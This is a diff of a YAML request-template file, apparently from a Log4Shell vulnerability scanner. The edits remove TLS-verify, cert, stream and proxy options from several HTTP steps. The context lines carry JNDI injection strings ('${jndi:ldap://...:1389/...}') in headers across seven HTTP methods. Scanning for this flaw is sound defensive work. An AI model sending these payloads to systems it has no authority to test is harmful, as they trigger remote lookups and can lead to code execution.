@@ -20,11 +20,7 @@ payloads:
   - library: http
     steps:
       - method: get
-        verify: false
         timeout: 3
-        cert: ""
-        stream: false
-        proxies: ""
         headers:
            User-Agent: "{user_agent}"
         url: "https://log4shell.huntress.com/"
@@ -40,11 +36,7 @@ payloads:
               reverse: false
 
       - method: get
-        verify: false
         timeout: 3
-        cert: ""
-        stream: false
-        proxies: ""
         headers:
           - A-IM: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
           - Accept: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
@@ -129,11 +121,7 @@ payloads:
               reverse: false
 
       - method: options
-        verify: false
         timeout: 3
-        cert: ""
-        stream: false
-        proxies: ""
         headers:
           - A-IM: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
           - Accept: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
@@ -219,11 +207,7 @@ payloads:
               reverse: false
 
       - method: head
-        verify: false
         timeout: 3
-        cert: ""
-        stream: false
-        proxies: ""
         headers:
           - A-IM: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
           - Accept: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
@@ -309,11 +293,7 @@ payloads:
               reverse: false
 
       - method: post
-        verify: false
         timeout: 3
-        cert: ""
-        stream: false
-        proxies: ""
         headers:
           - A-IM: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
           - Accept: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
@@ -401,11 +381,7 @@ payloads:
 
 
       - method: put
-        verify: false
         timeout: 3
-        cert: ""
-        stream: false
-        proxies: ""
         headers:
           - A-IM: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
           - Accept: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
@@ -491,11 +467,7 @@ payloads:
               reverse: false
 
       - method: patch
-        verify: false
         timeout: 3
-        cert: ""
-        stream: false
-        proxies: ""
         headers:
           - A-IM: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
           - Accept: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
@@ -581,11 +553,7 @@ payloads:
               reverse: false
 
       - method: delete
-        verify: false
         timeout: 3
-        cert: ""
-        stream: false
-        proxies: ""
         headers:
           - A-IM: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
           - Accept: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
@@ -672,11 +640,7 @@ payloads:
 
       # this request must stay in -1 position
       - method: get
-        verify: false
         timeout: 3
-        cert: ""
-        stream: false
-        proxies: ""
         headers:
           User-Agent: "{user_agent}"
         url:
